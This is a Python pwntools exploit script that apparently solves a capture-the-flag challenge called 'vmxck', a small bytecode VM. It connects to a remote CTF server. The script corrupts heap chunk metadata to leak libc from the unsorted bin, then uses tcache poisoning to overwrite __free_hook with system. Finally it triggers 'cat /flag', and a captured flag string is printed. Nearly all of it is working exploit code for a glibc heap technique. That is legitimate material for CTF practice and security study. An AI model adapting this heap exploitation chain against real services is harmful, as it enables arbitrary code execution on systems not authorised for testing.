from pwn import *
elf = ELF('./vmxck', checksec=False)
libc = ELF('/opt/glibc/x64/2.27/lib/libc.so.6', checksec=False)

def create(data):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b':', b'%s' % data)

def run(idx):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b':', b'%d' % idx)
    return p.recvline().strip().replace(b'1. create', b'')

def delete(idx):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b':', b'%d' % idx)

#p = elf.process()
p = remote('not.codepwnda.id', 17003)
# dq 0x555555558050 20
payload = b''.join([
    # 0x261 => 0x590+0x1
    # flag 0x1 for bypass corrupted size vs. prev_size
    # shift ke kiri untuk overwrite metadata chunk
    b'<'*7, b'+'*(0x3), 
    b'<'*1, b'+'*(0x90 + 0x1 -0x61)
])
create(payload) # 0
create(b'.')    # 1
create(b'.')    # 2
run(0)
delete(0)       # this goes unsorted bin

create(b'.>'*8) # 0
libc.address = u64(run(0)) - 0x3ec0f0#- 0x1b00f0
log.info('base : 0x%x'%libc.address)
delete(2)
delete(1)
delete(0)

payload = b''.join([
    # 0x261 => 0x271
    b'<'*8, b'+'*(0x10)
])
create(payload) # 0
create(b'B'*8)  # 1
create(p64(0) + p64(0x21))  # 2 , this will corrupt 0xd0 and doesn't go to tcachebins
create(b'D'*8)  # 3
run(0)

for i in range(4):
    delete(i)       # this will move chunk to tcachebins

create(p64(libc.sym['__free_hook']))    # 0
create(b'cat /flag\x00')   # 1
create(b'A'*8)             # 2
create(b'B'*8)             # 3

# tcache poisoning
create(p64(libc.sym['system'])) # 4 => 0
delete(1)
print(p.recvline())
# codepwnda{real_vm_escape_soon_tm_5db8ea1}